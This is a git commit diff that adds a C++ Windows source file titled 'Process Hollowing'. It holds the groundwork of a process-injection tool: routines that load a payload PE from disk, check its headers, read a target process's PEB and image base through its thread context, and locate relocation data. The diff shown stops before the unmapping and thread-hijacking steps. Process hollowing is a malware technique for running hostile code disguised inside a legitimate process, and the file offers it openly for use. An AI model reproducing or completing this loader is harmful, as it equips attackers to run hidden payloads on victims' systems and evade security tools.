10c234ca0f901b6f7fb9ac821a8e50687e6bcafc
ceo <localnet001@protonmail.com>
2025-08-10 23:08:16 -0300

    Add files via upload

---
+++ Process Hollowing/Process_Hollowing.cpp
@@ -0,0 +1,219 @@
+#include <Windows.h>
+#include <cstdio>
+#include <winternl.h>
+
+LPSTR lpSourceImage;
+LPSTR lpTargetProcess;
+
+struct ProcessAddressInformation
+{
+	LPVOID lpProcessPEBAddress;
+	LPVOID lpProcessImageBaseAddress;
+};
+
+typedef struct IMAGE_RELOCATION_ENTRY {
+	WORD Offset : 12;
+	WORD Type : 4;
+} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;
+
+HANDLE GetFileContent(const LPSTR lpFilePath)
+{
+	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(hFile);
+		return nullptr;
+	}
+
+	const DWORD dFileSize = GetFileSize(hFile, nullptr);
+	if (dFileSize == INVALID_FILE_SIZE)
+	{
+		CloseHandle(hFile);
+		return nullptr;
+	}
+
+	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
+	if (hFileContent == INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(hFile);
+		CloseHandle(hFileContent);
+		return nullptr;
+	}
+
+	const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
+	if (!bFileRead)
+	{
+		CloseHandle(hFile);
+		if (hFileContent != nullptr)
+			CloseHandle(hFileContent);
+		return nullptr;
+	}
+
+	CloseHandle(hFile);
+	return hFileContent;
+}
+
+BOOL IsValidPE(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
+		return TRUE;
+
+	return FALSE;
+}
+
+BOOL IsPE32(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
+		return TRUE;
+
+	return FALSE;
+}
+
+ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
+{
+	LPVOID lpImageBaseAddress = nullptr;
+	WOW64_CONTEXT CTX = {};
+	CTX.ContextFlags = CONTEXT_FULL;
+	Wow64GetThreadContext(lpPI->hThread, &CTX);
+	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
+	if (!bReadBaseAddress)
+		return ProcessAddressInformation{ nullptr, nullptr };
+
+	return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
+}
+
+ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
+{
+	LPVOID lpImageBaseAddress = nullptr;
+	CONTEXT CTX = {};
+	CTX.ContextFlags = CONTEXT_FULL;
+	GetThreadContext(lpPI->hThread, &CTX);
+	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
+	if (!bReadBaseAddress)
+		return ProcessAddressInformation{ nullptr, nullptr };
+
+	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
+}
+
+DWORD GetSubsytem32(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	return lpImageNTHeader->OptionalHeader.Subsystem;
+}
+
+DWORD GetSubsytem64(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	return lpImageNTHeader->OptionalHeader.Subsystem;
+}
+
+DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
+{
+	IMAGE_DOS_HEADER ImageDOSHeader = {};
+	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
+	if (!bGetDOSHeader)
+	{
+		return -1;
+	}
+
+	IMAGE_NT_HEADERS32 ImageNTHeader = {};
+	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
+	if (!bGetNTHeader)
+	{
+		return -1;
+	}
+
+	return ImageNTHeader.OptionalHeader.Subsystem;
+}
+
+DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
+{
+	IMAGE_DOS_HEADER ImageDOSHeader = {};
+	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
+	if (!bGetDOSHeader)
+	{
+		return -1;
+	}
+
+	IMAGE_NT_HEADERS64 ImageNTHeader = {};
+	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
+	if (!bGetNTHeader)
+	{
+		return -1;
+	}
+
+	return ImageNTHeader.OptionalHeader.Subsystem;
+}
+
+void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
+{
+	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
+		HeapFree(GetProcessHeap(), 0, hFileContent);
+
+	if (lpPI->hThread != nullptr)
+		CloseHandle(lpPI->hThread);
+
+	if (lpPI->hProcess != nullptr)
+	{
+		TerminateProcess(lpPI->hProcess, -1);
+		CloseHandle(lpPI->hProcess);
+	}
+}
+
+void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
+{
+	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
+		HeapFree(GetProcessHeap(), 0, hFileContent);
+
+	if (lpPI->hThread != nullptr)
+		CloseHandle(lpPI->hThread);
+
+	if (lpPI->hProcess != nullptr)
+		CloseHandle(lpPI->hProcess);
+}
+
+BOOL HasRelocation32(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+		return TRUE;
+
+	return FALSE;
+}
+
+BOOL HasRelocation64(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+		return TRUE;
+
+	return FALSE;
+}
+
+IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+	return {0, 0};
+}
+
+IMAGE_DATA_DIRECTORY GetRelocAddress64(const LPVOID lpImage)
+{
+	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
+	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+	return { 0, 0 };
+}
